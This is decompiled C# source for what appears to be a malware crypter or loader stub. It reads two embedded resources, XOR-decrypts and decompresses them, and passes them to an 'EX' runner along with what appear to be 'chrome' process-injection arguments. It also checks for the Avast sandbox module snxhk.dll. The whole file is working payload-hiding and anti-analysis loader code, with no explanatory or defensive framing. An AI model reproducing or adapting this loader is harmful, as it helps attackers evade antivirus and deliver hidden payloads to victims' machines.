using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.License;

public class _BASE
{
	private static Assembly assembly_0 = Assembly.GetExecutingAssembly();

	private static ResourceManager resourceManager_0 = new ResourceManager("Hamza", assembly_0);

	private static bool bool_0 = false;

	private static bool bool_1 = false;

	[STAThread]
	public static void Main()
	{
		//IL_00c6: Unknown result type (might be due to invalid IL or missing references)
		if (!License.Validate())
		{
			return;
		}
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = Process.GetCurrentProcess().Modules.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ProcessModule processModule = (ProcessModule)enumerator.Current;
					if (Operators.CompareString(processModule.ModuleName, "snxhk.dll", false) != 0)
					{
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			EX eX = new EX(smethod_1(), "Alternative", "Running", new object[7]
			{
				smethod_0(),
				"%ProcessName%",
				"",
				"Oui",
				"google ",
				"chrome",
				"chrome"
			});
			eX.Run();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	[SpecialName]
	private static byte[] smethod_0()
	{
		return Decompress(PolyIndia((byte[])NewLateBinding.LateGet((object)Encoding.Default, (Type)null, "GetBytes", new object[1] { RuntimeHelpers.GetObjectValue(resourceManager_0.GetObject("First")) }, (string[])null, (Type[])null, (bool[])null)));
	}

	[SpecialName]
	private static byte[] smethod_1()
	{
		return Decompress(PolyIndia((byte[])NewLateBinding.LateGet((object)Encoding.Default, (Type)null, "GetBytes", new object[1] { RuntimeHelpers.GetObjectValue(resourceManager_0.GetObject("Second")) }, (string[])null, (Type[])null, (bool[])null)));
	}

	public static byte[] PolyIndia(byte[] data)
	{
		checked
		{
			byte[] array = new byte[data.Length - 16 - 1 + 1];
			Buffer.BlockCopy(data, 16, array, 0, array.Length);
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = unchecked((byte)(array[i] ^ data[i % 16]));
			}
			return array;
		}
	}

	public static byte[] Decompress(byte[] data)
	{
		MemoryStream memoryStream = new MemoryStream();
		memoryStream.Write(data, 0, data.Length);
		memoryStream.Position = 0L;
		GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress, leaveOpen: true);
		MemoryStream memoryStream2 = new MemoryStream();
		byte[] array = new byte[64];
		int num = -1;
		for (num = gZipStream.Read(array, 0, array.Length); num > 0; num = gZipStream.Read(array, 0, array.Length))
		{
			memoryStream2.Write(array, 0, num);
		}
		gZipStream.Close();
		return memoryStream2.ToArray();
	}

	public static object Dynamic(Type Class, string Method, object[] Argument)
	{
		return Class.InvokeMember(Method, BindingFlags.InvokeMethod, null, null, Argument);
	}
}
